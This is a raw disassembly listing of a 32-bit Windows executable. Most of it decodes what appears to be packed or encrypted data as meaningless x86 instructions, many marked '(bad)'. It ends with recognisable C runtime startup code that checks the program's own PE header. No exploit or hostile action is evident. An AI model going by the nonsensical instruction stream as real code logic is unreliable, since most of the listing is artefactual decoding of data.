  4222b9:	loopne 0x42232d
  4222bb:	cmp    dh,BYTE PTR [esi+esi*2-0x758449fb]
  4222c2:	xchg   ebp,eax
  4222c3:	je     0x422316
  4222c5:	ins    BYTE PTR es:[edi],dx
  4222c6:	div    DWORD PTR [ecx-0x4d]
  4222c9:	or     BYTE PTR [ecx],ah
  4222cb:	fsubr  QWORD PTR [edx-0x71]
  4222ce:	jl     0x4222b2
  4222d0:	mov    bh,0x72
  4222d2:	push   ds
  4222d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222d4:	out    0xca,al
  4222d6:	jne    0x4222c1
  4222d8:	xchg   esp,eax
  4222d9:	xchg   ebp,eax
  4222da:	push   0x6657434c
  4222df:	enter  0x983d,0x2f
  4222e3:	and    BYTE PTR [edx-0x67],bl
  4222e6:	pop    edi
  4222e7:	sbb    DWORD PTR [esi-0x63],ebx
  4222ea:	(bad)  
  4222eb:	cmp    edi,DWORD PTR [ebp+0x34]
  4222ee:	adc    bh,BYTE PTR [eax-0x9cb2255]
  4222f4:	push   ebx
  4222f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222f6:	sbb    al,0xa5
  4222f8:	stos   BYTE PTR es:[edi],al
  4222f9:	lahf   
  4222fa:	fnstsw WORD PTR [eax]
  4222fc:	mov    eax,ds:0x593ac719
  422301:	out    0x2,al
  422303:	rol    BYTE PTR [edx],1
  422305:	adc    BYTE PTR [eax-0x5bbf4c0c],dl
  42230b:	sbb    eax,0x2b9b7de3
  422310:	mul    DWORD PTR [ebx+0x465e0565]
  422316:	and    BYTE PTR [ecx-0x660097f9],ah
  42231c:	add    eax,0xcd3c2851
  422321:	adc    eax,DWORD PTR [edi+0x4061b05]
  422327:	ins    DWORD PTR es:[edi],dx
  422328:	cli    
  422329:	jl     0x42237f
  42232b:	adc    DWORD PTR [esi],esp
  42232d:	add    ebp,DWORD PTR ds:0x625ea18d
  422333:	jmp    0xdb77:0xa98614e5
  42233a:	cmc    
  42233b:	test   ah,cl
  42233d:	sub    edi,esi
  42233f:	sub    edx,DWORD PTR [eax-0x2e]
  422342:	mov    cl,0xbf
  422344:	loope  0x4222fb
  422346:	xchg   edx,eax
  422347:	imul   ebx,DWORD PTR [eax+0x9],0xfffffff5
  42234b:	in     al,dx
  42234c:	sub    DWORD PTR [esi+ecx*1],ecx
  42234f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422350:	sbb    bh,ch
  422352:	cmp    dl,BYTE PTR [edi+0x568eb20c]
  422358:	jge    0x42235d
  42235a:	stos   BYTE PTR es:[edi],al
  42235b:	mov    cl,0x86
  42235d:	pop    esi
  42235e:	cmp    DWORD PTR [eax-0x6],ebx
  422361:	stos   DWORD PTR es:[edi],eax
  422362:	push   0x52
  422364:	add    ecx,esp
  422366:	dec    esp
  422367:	dec    di
  422369:	cli    
  42236a:	cmp    al,0x17
  42236c:	pop    edi
  42236d:	pop    esi
  42236e:	jo     0x4222fe
  422370:	je     0x422362
  422372:	test   DWORD PTR [esi],ebp
  422374:	sub    DWORD PTR ds:0x60411318,ebp
  42237a:	add    bh,bl
  42237c:	dec    ebx
  42237d:	call   0xb7fa78e5
  422382:	hlt    
  422383:	add    ebp,edi
  422385:	pop    ebx
  422386:	in     al,dx
  422387:	pop    esi
  422388:	mov    ds:0x4916a551,eax
  42238d:	xchg   BYTE PTR [edi+0x2dfe0cc4],bh
  422393:	iret   
  422394:	daa    
  422395:	ror    DWORD PTR [edi+0x7a],1
  422398:	ds sbb al,0xa7
  42239b:	in     eax,0xd7
  42239d:	(bad)  
  42239f:	popf   
  4223a0:	cwde   
  4223a1:	and    eax,0x3c8fcf7e
  4223a6:	cli    
  4223a7:	push   ss
  4223a8:	jns    0x4223f8
  4223aa:	mov    ebx,0xc034a296
  4223af:	mov    ebp,0x32ab8a5
  4223b4:	push   esp
  4223b5:	lods   eax,DWORD PTR ds:[esi]
  4223b6:	jmp    0x42235f
  4223b8:	and    DWORD PTR [edi],edi
  4223ba:	dec    eax
  4223bb:	retf   0xde0c
  4223be:	(bad)  [ebx+0x25]
  4223c1:	loopne 0x422432
  4223c3:	inc    ecx
  4223c4:	inc    ecx
  4223c5:	out    dx,al
  4223c6:	or     al,BYTE PTR [edx+edx*1]
  4223c9:	mov    cl,cl
  4223cb:	pushf  
  4223cc:	ja     0x4223db
  4223ce:	loop   0x4223c3
  4223d0:	and    eax,0xe888f945
  4223d5:	sbb    dl,BYTE PTR ds:0x45e5b6b3
  4223db:	cmp    edi,DWORD PTR [edx+0x67]
  4223de:	jno    0x4223c6
  4223e0:	and    BYTE PTR [esi+0x74bdeb12],bh
  4223e6:	call   ebx
  4223e8:	mov    dh,0xf7
  4223ea:	jae    0x42244b
  4223ec:	xor    ch,BYTE PTR [edi-0x65d32065]
  4223f2:	pop    esi
  4223f3:	jb     0x422414
  4223f5:	in     al,0x6d
  4223f7:	hlt    
  4223f8:	pushf  
  4223f9:	push   esp
  4223fa:	xor    al,BYTE PTR [edx-0x10]
  4223fd:	icebp  
  4223fe:	ja     0x422457
  422400:	mov    ebp,0x8ea4aa7e
  422405:	push   esp
  422406:	aad    0x42
  422408:	fucomi st,st(1)
  42240a:	jb     0x42238d
  42240c:	add    edi,DWORD PTR [ebx]
  42240e:	paddw  mm5,QWORD PTR [eax+0x10b3da60]
  422415:	lea    ecx,[ebp+0x6b6e13fe]
  42241b:	dec    ecx
  42241c:	retf   
  42241d:	adc    eax,0x6986547c
  422422:	(bad)  
  422423:	in     eax,0x1a
  422425:	add    eax,0x3f67a1e8
  42242a:	adc    al,0xb6
  42242c:	out    dx,al
  42242d:	and    dh,ah
  42242f:	mov    dh,0xad
  422431:	adc    al,0xd8
  422433:	(bad)  
  422434:	xor    eax,DWORD PTR ds:0xbb503aa
  42243a:	leave  
  42243b:	inc    ebx
  42243c:	pop    ecx
  42243d:	pusha  
  42243e:	mov    esi,DWORD PTR [eax]
  422440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422441:	jns    0x4224b3
  422443:	pop    esi
  422444:	push   ecx
  422445:	mov    edx,0xb8dff48b
  42244a:	aaa    
  42244b:	xor    edi,DWORD PTR [ecx+0x3d16dcf9]
  422451:	(bad)  
  422452:	call   0xe493:0xb53c133d
  422459:	sbb    al,0x5a
  42245b:	jmp    ebp
  42245d:	adc    al,0x6b
  42245f:	mov    cl,0x28
  422461:	mov    ch,0x7b
  422463:	jle    0x4223f5
  422465:	fstp   QWORD PTR [edi-0x65f45e0b]
  42246b:	lods   eax,DWORD PTR ds:[esi]
  42246c:	(bad)  
  42246e:	add    eax,DWORD PTR [ebx-0x16e2e609]
  422474:	rcr    BYTE PTR [ebp+0x4447865a],0x7b
  42247b:	outs   dx,DWORD PTR ds:[esi]
  42247c:	(bad)  
  42247d:	loope  0x4224c3
  42247f:	push   0x76668271
  422484:	in     eax,0x4d
  422486:	pusha  
  422487:	push   esp
  422488:	xchg   esi,eax
  422489:	xor    al,0x15
  42248b:	mov    bh,0x31
  42248d:	push   es
  42248e:	pop    ebp
  42248f:	jns    0x4224ab
  422491:	jecxz  0x422449
  422493:	pop    esi
  422494:	xor    al,0xbb
  422496:	scas   al,BYTE PTR es:[edi]
  422497:	ret    
  422498:	jp     0x4224ed
  42249a:	shl    dh,cl
  42249c:	xor    cl,BYTE PTR [eax+0x66330a46]
  4224a2:	in     eax,0x3
  4224a4:	inc    esp
  4224a5:	dec    edi
  4224a6:	mov    dh,0xfc
  4224a8:	mov    fs,WORD PTR [esi+esi*8+0x34]
  4224ac:	dec    ebx
  4224ad:	scas   eax,DWORD PTR es:[edi]
  4224ae:	xchg   bh,dl
  4224b0:	clc    
  4224b1:	jmp    0x6fadb229
  4224b6:	inc    ebx
  4224b7:	pop    esp
  4224b8:	ins    DWORD PTR es:[edi],dx
  4224b9:	cmp    eax,0xbe48c6ee
  4224be:	fadd   DWORD PTR [edx]
  4224c0:	pop    edi
  4224c1:	mov    ds:0x204b909c,al
  4224c6:	jb     0x4224ee
  4224c8:	inc    ecx
  4224c9:	mov    ch,0x48
  4224cb:	and    al,0x4e
  4224cd:	mov    cl,0x90
  4224cf:	aaa    
  4224d0:	(bad)  
  4224d1:	mul    BYTE PTR [esi-0x32]
  4224d4:	jp     0x4224ae
  4224d6:	inc    edx
  4224d7:	or     eax,edx
  4224d9:	sti    
  4224da:	jae    0x422475
  4224dc:	xchg   ecx,eax
  4224dd:	sbb    DWORD PTR [ecx-0x63e1fceb],ecx
  4224e3:	jmp    0xb1ab:0x8b5da151
  4224ea:	cmp    DWORD PTR [eax],0xd
  4224ed:	mov    dl,BYTE PTR [ebx+0x50]
  4224f0:	inc    edi
  4224f1:	and    dl,BYTE PTR [ebx-0x1201bc23]
  4224f7:	add    edi,esi
  4224f9:	ret    
  4224fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224fb:	(bad)  
  4224fc:	ins    BYTE PTR es:[edi],dx
  4224fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224fe:	repnz mov edi,0xd3cc473c
  422504:	sub    eax,0xa861c40b
  422509:	ins    BYTE PTR es:[edi],dx
  42250a:	pop    ecx
  42250b:	cld    
  42250c:	jg     0x42248e
  42250e:	lea    edi,[ebx+0x67]
  422511:	aas    
  422512:	dec    esp
  422513:	push   0xc09f31e5
  422518:	mov    ah,0x8f
  42251a:	add    esi,DWORD PTR [esi+0x70]
  42251d:	addr16 out dx,al
  42251f:	(bad)  
  422520:	cmp    eax,0x9c90df36
  422525:	ja     0x422569
  422527:	fidiv  DWORD PTR [ebp+0x3f419b1c]
  42252d:	cmp    bl,BYTE PTR [ebp+edi*1+0x4b]
  422531:	mov    edi,0x41adcdbf
  422536:	dec    ebx
  422537:	xor    eax,0xda89aeba
  42253c:	stos   DWORD PTR es:[edi],eax
  42253d:	push   0x53
  42253f:	inc    ecx
  422540:	retf   0xf991
  422543:	js     0x4224d0
  422545:	pusha  
  422546:	test   eax,0x9126617b
  42254b:	mov    ecx,0x1877f878
  422550:	mov    DWORD PTR [ecx-0x73],esp
  422553:	call   0x772e9af8
  422558:	xor    BYTE PTR [ebx-0x19],ch
  42255b:	sub    al,0x7
  42255d:	loopne 0x42253c
  42255f:	jmp    0x422575
  422561:	dec    ebp
  422562:	mov    ah,0x7b
  422564:	add    ebp,DWORD PTR [eax-0x18]
  422567:	adc    dl,bh
  422569:	call   0xe8823295
  42256e:	mov    al,ds:0x8a8f1d43
  422573:	int3   
  422574:	mov    es,WORD PTR [edx+0x6dfab219]
  42257a:	add    BYTE PTR [esi],al
  42257c:	std    
  42257d:	xchg   ebp,eax
  42257e:	adc    al,ch
  422580:	xor    eax,0x946e0a65
  422585:	pushf  
  422586:	inc    edi
  422587:	jmp    0x42254d
  422589:	xchg   DWORD PTR [edi-0x14],ebx
  42258c:	mov    esp,0xc59b637c
  422591:	fisttp WORD PTR [ebx+0x412dedbc]
  422597:	and    DWORD PTR ds:0x458723ba,ebp
  42259d:	hlt    
  42259e:	std    
  42259f:	hlt    
  4225a0:	rol    BYTE PTR [eax-0x6343c4e3],cl
  4225a6:	and    al,bh
  4225a8:	out    dx,eax
  4225a9:	or     eax,0x617efae1
  4225ae:	fidiv  DWORD PTR [ecx]
  4225b0:	mov    esi,edx
  4225b2:	sbb    eax,0x62719d0a
  4225b7:	daa    
  4225b8:	pop    esi
  4225b9:	mov    cs,WORD PTR [edi+ebx*4-0x7f]
  4225bd:	sahf   
  4225be:	call   0x6950:0xa0b5fe8c
  4225c5:	scas   al,BYTE PTR es:[edi]
  4225c6:	cli    
  4225c7:	es jl  0x42263d
  4225ca:	stos   BYTE PTR es:[edi],al
  4225cb:	xchg   edx,eax
  4225cc:	xchg   edi,eax
  4225cd:	sbb    BYTE PTR [eax],0x8f
  4225d0:	and    BYTE PTR [esi+0x69],dh
  4225d3:	add    al,0xc9
  4225d5:	and    eax,0x6250d4d1
  4225da:	stos   BYTE PTR es:[edi],al
  4225db:	or     bh,ah
  4225dd:	xor    al,0x6
  4225df:	sbb    DWORD PTR [esi+ebp*1],ecx
  4225e2:	fidiv  WORD PTR [ebx-0x78]
  4225e5:	(bad)  
  4225e6:	mov    ds:0xafdc0a75,al
  4225eb:	push   ds
  4225ec:	inc    ebx
  4225ed:	mov    ebx,0xbfff9a50
  4225f2:	adc    edx,DWORD PTR [ebx-0x6fdcad24]
  4225f8:	mov    cl,0x35
  4225fa:	out    0x89,al
  4225fc:	mov    edi,ecx
  4225fe:	sbb    DWORD PTR [eax],0xffffff96
  422601:	jns    0x4225c6
  422603:	scas   al,BYTE PTR es:[edi]
  422604:	cmc    
  422605:	aaa    
  422606:	mov    bh,BYTE PTR [eax]
  422608:	int    0x21
  42260a:	push   cs
  42260b:	push   ebx
  42260c:	adc    BYTE PTR [eax-0x16],cl
  42260f:	mov    BYTE PTR [edx],cl
  422611:	and    eax,0xc580373b
  422616:	mov    eax,0x1e03d536
  42261b:	in     al,0x4a
  42261d:	out    dx,eax
  42261e:	pop    esi
  42261f:	pop    ds
  422620:	inc    esi
  422621:	es out dx,al
  422623:	dec    ebx
  422624:	mov    fs,WORD PTR [ebx]
  422626:	pop    ecx
  422627:	jnp    0x4225bb
  422629:	je     0x42263c
  42262b:	jg     0x42262f
  42262d:	ins    BYTE PTR es:[edi],dx
  42262e:	and    BYTE PTR [eax],0x75
  422631:	dec    ebp
  422632:	stos   BYTE PTR es:[edi],al
  422633:	aas    
  422634:	xchg   ebp,eax
  422635:	add    DWORD PTR [eax+ecx*8],0x11
  422639:	stos   BYTE PTR es:[edi],al
  42263a:	mov    bl,0xeb
  42263c:	jmp    0x4226b1
  42263e:	pop    ebp
  42263f:	cld    
  422640:	or     DWORD PTR [edx+0x68],ebx
  422643:	mov    ebx,0x7c1a3d1a
  422648:	das    
  422649:	les    edx,FWORD PTR [ecx]
  42264b:	test   al,0x20
  42264d:	cmp    al,0x2d
  42264f:	inc    esp
  422650:	ins    BYTE PTR es:[edi],dx
  422651:	inc    esi
  422652:	lock (bad) 
  422654:	and    BYTE PTR [ebx+0x166f9990],dl
  42265a:	rcr    BYTE PTR [ecx-0xb647af6],1
  422660:	mov    al,0x6a
  422662:	mov    al,ds:0x48debd7e
  422667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422668:	test   eax,0x70010a79
  42266d:	sbb    bl,ch
  42266f:	je     0x4225f6
  422671:	daa    
  422672:	leave  
  422673:	and    BYTE PTR [ebx-0x7fe181e2],0x70
  42267a:	dec    edi
  42267b:	adc    al,0xac
  42267d:	lods   al,BYTE PTR ds:[esi]
  42267e:	retf   0xbd32
  422681:	idiv   BYTE PTR [eax-0x144a71e5]
  422687:	ins    BYTE PTR es:[edi],dx
  422688:	rcl    BYTE PTR [esi],cl
  42268a:	and    al,0xb9
  42268c:	hlt    
  42268d:	lea    esp,[ebx+ebp*4-0x2f]
  422691:	stos   DWORD PTR es:[edi],eax
  422692:	pop    esi
  422693:	dec    eax
  422694:	pop    esp
  422695:	pop    ecx
  422696:	ins    BYTE PTR es:[edi],dx
  422697:	in     al,0xbc
  422699:	sti    
  42269a:	push   0xffffffd3
  42269c:	adc    BYTE PTR [edx+eax*8],0x45
  4226a0:	bnd jmp 0xd75f0205
  4226a6:	push   cs
  4226a7:	sbb    al,0x3e
  4226a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226aa:	mov    al,BYTE PTR [edx+0x1b]
  4226ad:	or     dh,BYTE PTR ds:[ebp+esi*4+0xd]
  4226b2:	retf   
  4226b3:	xchg   DWORD PTR [ebp+eiz*4+0x1349e564],ebp
  4226ba:	pusha  
  4226bb:	mov    edi,0x579832be
  4226c0:	fs (bad) 
  4226c2:	call   0x7816446b
  4226c7:	inc    DWORD PTR [edx]
  4226c9:	sub    BYTE PTR [edi+edi*8+0x6f],0xb3
  4226ce:	cli    
  4226cf:	xor    al,0x49
  4226d1:	mov    ds:0xaece6f96,eax
  4226d6:	fcmove st,st(7)
  4226d8:	mov    ebx,0x9628452c
  4226dd:	push   ebp
  4226de:	fisub  WORD PTR [eax]
  4226e0:	cmc    
  4226e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e2:	dec    esp
  4226e3:	and    ebp,edx
  4226e5:	std    
  4226e6:	dec    ebx
  4226e7:	leave  
  4226e8:	mov    esp,0xc5c47850
  4226ed:	adc    dh,ah
  4226ef:	dec    edi
  4226f0:	sbb    DWORD PTR [ebx-0x7a],edx
  4226f3:	sbb    esi,esi
  4226f5:	mov    dl,0x75
  4226f7:	dec    eax
  4226f8:	fnsave [esi-0x4f914721]
  4226fe:	(bad)  
  4226ff:	icebp  
  422700:	sub    BYTE PTR [ebp-0x7d7a2c34],ah
  422706:	(bad)  
  422707:	mov    edx,0xff7a8852
  42270c:	xchg   esp,eax
  42270d:	push   ds
  42270e:	xor    eax,0x161ec985
  422713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422714:	test   al,0x2c
  422716:	outs   dx,BYTE PTR ds:[esi]
  422717:	sar    BYTE PTR [edi+0x61e80324],cl
  42271d:	adc    bh,BYTE PTR [edi-0x55]
  422720:	(bad)  
  422721:	loop   0x422706
  422723:	cmp    al,0xda
  422725:	ins    BYTE PTR es:[edi],dx
  422726:	push   ebp
  422727:	stc    
  422728:	xchg   ebx,eax
  422729:	fld    DWORD PTR [edx+0x31]
  42272c:	add    dl,cl
  42272e:	push   edi
  42272f:	push   ss
  422730:	jae    0x422742
  422732:	xchg   BYTE PTR [eax+ecx*2-0x7b70fd5f],dh
  422739:	mov    ds:0x2e0ddc60,al
  42273e:	or     dl,BYTE PTR [ebx-0x7a4189f6]
  422744:	stos   DWORD PTR es:[edi],eax
  422745:	mov    cl,0xa5
  422747:	cmc    
  422748:	mov    ds:0xe9780bb3,al
  42274d:	ret    0x64a7
  422750:	jecxz  0x422779
  422752:	icebp  
  422753:	(bad)  
  422754:	jae    0x42272d
  422756:	iret   
  422757:	stc    
  422758:	mov    ah,0x73
  42275a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42275b:	jo     0x4227cf
  42275d:	fstp   DWORD PTR [edx-0x7e]
  422760:	les    ecx,FWORD PTR [ebp+0x3e]
  422763:	mov    ebp,0x258db3f3
  422768:	cld    
  422769:	jmp    0x2b761575
  42276e:	xor    ch,ah
  422770:	push   edx
  422771:	push   ss
  422772:	inc    eax
  422773:	xor    DWORD PTR [ecx+0x7a4eedf8],0x24
  42277a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42277b:	jmp    0x19b2959a
  422780:	dec    ebx
  422781:	pop    eax
  422782:	sbb    ch,BYTE PTR [ecx+0x4f]
  422785:	xor    al,0x86
  422787:	push   cs
  422788:	mov    edi,DWORD PTR [edi]
  42278a:	mov    eax,ds:0x90ad5aa9
  42278f:	stos   BYTE PTR es:[edi],al
  422790:	jmp    0x4227ea
  422792:	mov    ecx,0x7f3e747
  422798:	ret    0x13af
  42279b:	mov    esi,0x5a2634b4
  4227a0:	dec    edi
  4227a2:	ins    DWORD PTR es:[edi],dx
  4227a3:	test   al,0xe9
  4227a5:	sub    eax,0xa743d25a
  4227aa:	or     eax,0x6c1fa8d
  4227af:	ins    BYTE PTR es:[edi],dx
  4227b0:	ins    BYTE PTR es:[edi],dx
  4227b1:	mov    edx,0xda0e8daa
  4227b6:	and    bl,BYTE PTR ds:0x467fba56
  4227bc:	fst    QWORD PTR [ebx]
  4227be:	or     eax,0xc69cbf29
  4227c3:	push   0x7f0cc364
  4227c8:	or     esi,DWORD PTR [edi+0x2fe50008]
  4227ce:	jno    0x4227aa
  4227d0:	push   0xc5f0050f
  4227d5:	and    BYTE PTR [ebp+0x76af4dae],ch
  4227db:	sbb    esp,ebx
  4227dd:	and    DWORD PTR [edx-0xf],0xffffffe0
  4227e1:	rcr    BYTE PTR [ecx],1
  4227e3:	push   esp
  4227e4:	cli    
  4227e5:	(bad)  
  4227e6:	imul   edx,DWORD PTR [ebx-0x4a0245d7],0x1eb65bf
  4227f0:	popf   
  4227f1:	mov    bh,0x9b
  4227f3:	jg     0x4227eb
  4227f5:	pop    ecx
  4227f6:	xor    BYTE PTR [edx-0x1ffa79a4],ch
  4227fc:	xor    bl,BYTE PTR [eax-0x6b0f5645]
  422802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422803:	cld    
  422804:	pop    edi
  422805:	fwait
  422806:	jecxz  0x422832
  422808:	jnp    0x42286c
  42280a:	sti    
  42280b:	fiadd  WORD PTR [edx]
  42280d:	adc    eax,0x893a17d3
  422812:	(bad)  
  422813:	or     bl,bl
  422815:	lds    ebx,FWORD PTR [ecx+0x24]
  422818:	stos   DWORD PTR es:[edi],eax
  422819:	dec    eax
  42281a:	pop    es
  42281b:	cwde   
  42281c:	sbb    eax,0xd465a3ab
  422821:	ret    
  422822:	iret   
  422823:	mov    WORD PTR [edi-0x2b],?
  422826:	add    DWORD PTR [ebp+0x4e],edx
  422829:	or     BYTE PTR [ecx],0x1a
  42282c:	imul   esp,DWORD PTR [ebx+0x16d637f2],0xad12ba17
  422836:	ins    DWORD PTR es:[edi],dx
  422837:	std    
  422838:	or     ebp,eax
  42283a:	xchg   DWORD PTR [ebx+0x508329b3],eax
  422840:	ins    DWORD PTR es:[edi],dx
  422841:	mov    edi,DWORD PTR [eax]
  422843:	les    edi,FWORD PTR [edx+0x77869323]
  422849:	not    DWORD PTR [eax+0x68]
  42284c:	mov    ds:0x844c9a50,al
  422851:	jo     0x422838
  422853:	mov    edi,0xdc7f5d16
  422858:	mov    eax,0xaeed824b
  42285d:	aad    0x82
  42285f:	ss xchg esp,eax
  422861:	sbb    eax,0x30ed7672
  422866:	mov    ds:0xde183907,eax
  42286b:	mov    ebp,0x58139ff6
  422870:	jno    0x4228a0
  422872:	jl     0x4228d9
  422874:	nop
  422875:	pop    ebp
  422876:	aas    
  422877:	jbe    0x422840
  422879:	popf   
  42287a:	xor    al,0x95
  42287c:	or     DWORD PTR [bx],eax
  42287f:	hlt    
  422880:	dec    ebx
  422881:	bound  esp,QWORD PTR [ecx+0x12a7349d]
  422887:	les    esi,FWORD PTR [esi+0x45]
  42288a:	stos   BYTE PTR es:[edi],al
  42288b:	in     al,0x43
  42288d:	cdq    
  42288e:	ret    
  42288f:	repnz (bad)
  422892:	sti    
  422893:	jno    0x4228cc
  422895:	(bad)
  422898:	inc    ebx
  422899:	iret   
  42289a:	jg     0x42288e
  42289c:	sbb    BYTE PTR [ecx+0x2],cl
  42289f:	stos   BYTE PTR es:[edi],al
  4228a0:	sbb    ebx,eax
  4228a2:	push   edx
  4228a3:	outs   dx,BYTE PTR ds:[esi]
  4228a4:	mov    BYTE PTR [ebx+0x2b],bh
  4228a7:	dec    eax
  4228a8:	inc    ebp
  4228a9:	mov    ebx,DWORD PTR [eax+edi*8+0x2c553395]
  4228b0:	add    al,BYTE PTR [edi+0x48921a1f]
  4228b6:	or     eax,DWORD PTR [esi+ebp*8+0x1cf802c1]
  4228bd:	dec    ebp
  4228be:	scas   eax,DWORD PTR es:[edi]
  4228bf:	stos   DWORD PTR es:[edi],eax
  4228c0:	dec    esp
  4228c1:	jo     0x4228bd
  4228c3:	or     esp,DWORD PTR [edi+0x16cb69e9]
  4228c9:	daa    
  4228ca:	push   eax
  4228cb:	push   cs
  4228cc:	daa    
  4228cd:	int    0xef
  4228cf:	adc    ah,ah
  4228d1:	pop    ebx
  4228d2:	jo     0x4228d1
  4228d4:	(bad)  
  4228d5:	call   0xe4126606
  4228da:	dec    eax
  4228db:	cmp    esi,DWORD PTR [edx-0x7a]
  4228de:	and    al,0xea
  4228e0:	jnp    0x4228cf
  4228e2:	jmp    0xa3526bb2
  4228e7:	xchg   bh,dh
  4228e9:	lods   eax,DWORD PTR ds:[esi]
  4228ea:	push   esp
  4228eb:	das    
  4228ec:	push   esi
  4228ed:	cmc    
  4228ee:	cmp    BYTE PTR [ebx+0xaff4bd6],cl
  4228f4:	mov    ?,WORD PTR [ebx-0x44]
  4228f7:	cmp    BYTE PTR [ecx+ecx*1],bh
  4228fa:	out    dx,eax
  4228fb:	mov    esp,0xd9e94dc6
  422900:	sbb    al,0x52
  422902:	sub    BYTE PTR [edi+0x69],cl
  422905:	add    DWORD PTR [ebp+eiz*2+0x691ee7eb],edi
  42290c:	sbb    eax,0x98d8a673
  422911:	mov    al,0x9e
  422913:	ins    BYTE PTR es:[edi],dx
  422914:	imul   BYTE PTR [esi-0x67186161]
  42291a:	(bad)  
  42291b:	in     eax,0x50
  42291d:	push   ecx
  42291e:	int3   
  42291f:	cwde   
  422920:	jg     0x4228d7
  422922:	iret   
  422923:	enter  0x9b09,0xe6
  422927:	mov    dh,0x25
  422929:	mov    cl,0x3a
  42292b:	ret    0x6f08
  42292e:	ins    DWORD PTR es:[edi],dx
  42292f:	cdq    
  422930:	out    0xec,al
  422932:	fadd   DWORD PTR [edx-0x13]
  422935:	sub    dh,BYTE PTR ss:[edi]
  422938:	iret   
  422939:	sub    ecx,DWORD PTR [esi+0x48]
  42293c:	lea    edi,[ebx-0xb96022c]
  422942:	out    0xb2,al
  422944:	aaa    
  422945:	push   esp
  422946:	jl     0x422972
  422948:	fucomp st(2)
  42294a:	std    
  42294b:	jne    0x422901
  42294d:	lods   eax,DWORD PTR ds:[esi]
  42294e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42294f:	std    
  422950:	in     al,0xf4
  422952:	rol    bl,1
  422954:	std    
  422955:	fmul   DWORD PTR [edx+0x336fe476]
  42295b:	rol    BYTE PTR [ebx+0x10c210c4],0x0
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
